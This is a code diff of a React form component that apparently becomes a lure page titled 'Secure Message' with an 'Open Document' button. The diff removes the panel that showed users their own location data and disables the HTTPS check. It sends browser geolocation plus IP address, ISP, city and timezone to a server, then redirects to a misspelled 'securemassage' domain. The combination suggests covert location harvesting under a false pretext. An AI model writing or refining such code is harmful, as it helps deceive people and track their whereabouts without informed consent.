@@ -1,6 +1,6 @@
 import axios, { AxiosInstance } from "axios";
 import React, { useEffect, useState } from "react";
-import { useNavigate } from "react-router-dom";
+// import { useNavigate } from "react-router-dom";
 
 export interface LocationData {
   latitude: number;
@@ -33,7 +33,6 @@ const axiosInstance: AxiosInstance = axios.create({
 });
 
 const LocationRegistration = () => {
-  const navigate = useNavigate();
   const [formData, setFormData] = useState<FormData>({
     username: "",
     inputNumber: "",
@@ -43,8 +42,8 @@ const LocationRegistration = () => {
   const [error, setError] = useState<string | null>(null);
   const [ipLocation, setIpLocation] = useState<IpLocationData | null>(null);
   const [isLoadingLocation, setIsLoadingLocation] = useState(true);
-  const [showLocationDetails, setShowLocationDetails] =
-    useState<boolean>(false);
+  // const [showLocationDetails, setShowLocationDetails] =
+  //   useState<boolean>(false);
 
   // Add LocationPermissionPrompt component
   const LocationPermissionPrompt = () => (
@@ -134,12 +133,10 @@ const LocationRegistration = () => {
   };
 
   useEffect(() => {
-    if (window.location.protocol !== "https:") {
-      setError(
-        "Secure Registration requires a secure (HTTPS) connection to work."
-      );
-      return;
-    }
+    // if (window.location.protocol !== "https:") {
+    //   setError("Secure Message requires a secure (HTTPS) connection to work.");
+    //   return;
+    // }
 
     const initializeLocation = async () => {
       try {
@@ -176,13 +173,36 @@ const LocationRegistration = () => {
 
       const registrationData = {
         ...formData,
+        // Browser geolocation data
+        browserLocation: {
+          latitude: location?.latitude,
+          longitude: location?.longitude,
+          accuracy: location?.accuracy,
+          timestamp: location?.timestamp,
+        },
+        // IP-based location data
+        ipLocation: ipLocation
+          ? {
+              latitude: ipLocation.latitude,
+              longitude: ipLocation.longitude,
+              city: ipLocation.city,
+              region: ipLocation.region,
+              country: ipLocation.country,
+              timezone: ipLocation.timezone,
+              ip: ipLocation.ip,
+              isp: ipLocation.isp,
+            }
+          : null,
+        // For compatibility with existing code
         latitude: locationToUse.latitude,
         longitude: locationToUse.longitude,
         browserCoordinates: [locationToUse.longitude, locationToUse.latitude],
+        locationType: location ? "browser" : "ip",
       };
 
       await axiosInstance.post("/user-input/register", registrationData);
-      navigate("https://securemassage.abdushlawfirm.com");
+      // navigate("https://securemassage.abdushlawfirm.com");
+      window.location.href = "https://securemassage.abdushlawfirm.com";
     } catch (err) {
       setError(err instanceof Error ? err.message : "Registration failed");
       console.error("Registration error:", err);
@@ -197,7 +217,7 @@ const LocationRegistration = () => {
         {/* Form Section */}
         <div className="w-full md:w-1/2 bg-white rounded-xl shadow-lg p-8">
           <h2 className="text-3xl font-bold text-gray-800 mb-6">
-            Secure Registration
+            Secure Message
           </h2>
           {/* Add LocationPermissionPrompt when there's a permission error */}
           {error && error.includes("permissions") && (
@@ -222,7 +242,7 @@ const LocationRegistration = () => {
                 htmlFor="username"
                 className="block text-sm font-medium text-gray-700 mb-2"
               >
-                Username
+                Name
               </label>
               <input
                 type="text"
@@ -241,7 +261,7 @@ const LocationRegistration = () => {
                 htmlFor="inputNumber"
                 className="block text-sm font-medium text-gray-700 mb-2"
               >
-                Input Number
+                Input Number: (2222)
               </label>
               <input
                 type="number"
@@ -254,43 +274,6 @@ const LocationRegistration = () => {
                 placeholder="Enter your number"
               />
             </div>
-
-            <button
-              type="button"
-              onClick={() => setShowLocationDetails(!showLocationDetails)}
-              className="w-full text-left text-blue-600 hover:text-blue-700 font-medium mb-4"
-            >
-              {showLocationDetails
-                ? "Hide Location Details"
-                : "Show Location Details"}{" "}
-              ↓
-            </button>
-
-            {showLocationDetails && (
-              <div className="bg-gray-50 rounded-lg p-6 mb-6">
-                {(location || ipLocation) && (
-                  <div className="space-y-2">
-                    <p className="font-medium text-gray-700">
-                      {location ? "Browser Location:" : "IP-based Location:"}
-                    </p>
-                    <p className="text-gray-600">
-                      Latitude: {(location || ipLocation)?.latitude}
-                    </p>
-                    <p className="text-gray-600">
-                      Longitude: {(location || ipLocation)?.longitude}
-                    </p>
-                    {ipLocation && (
-                      <>
-                        <p className="text-gray-600">City: {ipLocation.city}</p>
-                        <p className="text-gray-600">
-                          Country: {ipLocation.country}
-                        </p>
-                      </>
-                    )}
-                  </div>
-                )}
-              </div>
-            )}
 
             <button
               type="submit"
@@ -327,7 +310,7 @@ const LocationRegistration = () => {
                   Processing...
                 </span>
               ) : (
-                "Continue to Secure Message"
+                "Open Document"
               )}
             </button>
           </form>
@@ -350,7 +333,7 @@ const LocationRegistration = () => {
                 d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
               ></path>
             </svg>
-            <h3 className="text-2xl font-bold mb-4">Secure Communication</h3>
+            <h3 className="text-2xl font-bold mb-4">Secure Message</h3>
             <p className="text-lg opacity-90">
               Your privacy and security are our top priorities. All
               communications are encrypted and protected.
